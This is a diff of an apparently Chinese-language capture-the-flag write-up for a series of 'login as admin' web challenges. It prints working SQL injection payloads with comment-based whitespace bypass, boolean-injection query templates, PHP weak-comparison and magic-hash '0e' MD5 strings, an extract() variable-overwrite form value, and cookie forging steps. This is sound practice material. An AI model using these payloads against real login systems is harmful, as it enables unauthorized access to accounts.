@@ -104,12 +104,12 @@ $_POST = array_map(safe_filter, $_POST);
 
 ```admin\' union select 1,group_concat(the_f14g),3,4 FROM h1dden_f14g#```
 
-## 22 login as admin 1
+## 23 login as admin 1
 要以isadmin為True的狀態登入，然後此題的空白字元會被限制，可以使用\"/\*\*/\"來繞過。
 
 可輸入"admin\\'or\/\*\*\/isadmin#"來進行登入
 
-## 22 login as admin 1.2
+## 24 login as admin 1.2
 先使用 order by確定查詢的column數"aaa\\'/\*\*/or/\*\*/isadmin/\*\*/order/\*\*/by/\*\*/4#"
 
 然後isadmin位於第四個欄位，所以接著於第四個使用boolean injection來爆出table name
@@ -142,6 +142,79 @@ query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(column_nam
 query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(4a391a11cfa831ca740cf8d00782f3a6),{},1))={}/**/from/**/0bdb54c98123f5526ccaed982d2006a9#'
 ```
 
+
+## 25 login as admin 3
+這題使用到了php的weak comparison。
+
+當php進行下列比較時會return ture
+```php=
+"php" == true;
+```
+
+因此將cookie中的admin資料改為true，sig的資料也改為true後，伺服端進行比對時便會return true。
+
+## 26 login as admin 4
+可使用curl來繞過header的Redirect
+```cmd=
+curl -d "name=admin" https://ctf.hackme.quest/login4/
+```
+
+或者可以使用python的request並disallow掉redirect
+```python=
+import requests
+
+url = 'https://ctf.hackme.quest/login4/'
+post = {'name': 'admin'}
+ret = requests.post(url, post, allow_redirects=False)
+print(ret.text)
+```
+
+## 27 login as admin 6
+在使用extract($data)時，原有的變數內容會被data中的資料所覆蓋。
+因此將表單中hidden標籤中的內容修改如下便可。
+```htmlembedded=
+<input type="hidden" name="data" id="data" value='{"username":"admin","password":"123", "users":{"admin": "123", "guest": "guest"}}'>
+```
+
+{"username":"admin","password":"123", "users":{"admin": "123", "guest": "guest"}}
+
+## 28 login as admin 7
+如果0e開頭的字串與"000000"...進行弱比較時會視為相等，因此只要找到經過md5後開頭為0e的字串便可。
+
+可參考下方之值
+```
+s878926199a
+0e545993274517709034328855841020
+s155964671a
+0e342768416822451524974117254469
+s214587387a
+0e848240448830537924465865611904
+s214587387a
+0e848240448830537924465865611904
+s878926199a
+0e545993274517709034328855841020
+s1091221200a
+0e940624217856561557816327384675
+s1885207154a
+0e509367213418206700842008763514
+s1502113478a
+0e861580163291561247404381396064
+s1885207154a
+0e509367213418206700842008763514
+s1836677006a
+0e481036490867661113260034900752
+s155964671a
+0e342768416822451524974117254469
+
+```
+
+## 29 login as admin 8
+先以guest/guest登入後觀察login8cookie 和 login8sha512 cookie，其中login8cookie是以url encoded，解碼後將is_admin改為1並做sha512修改cookie。
+
+由於%00 null byte的問題，直接進行複製有可能會出錯，可以至[SHA512](https://emn178.github.io/online-tools/sha512.html)開啟dev tool並使用sha512(decodeURIComponent(cookie))
+
+## 30 login as admin 8.1
+請參考此[網站](https://blog.maple3142.net/2020/07/23/hackme-ctf-experience-and-hints/#login-as-admin-8.1)
 
 
 
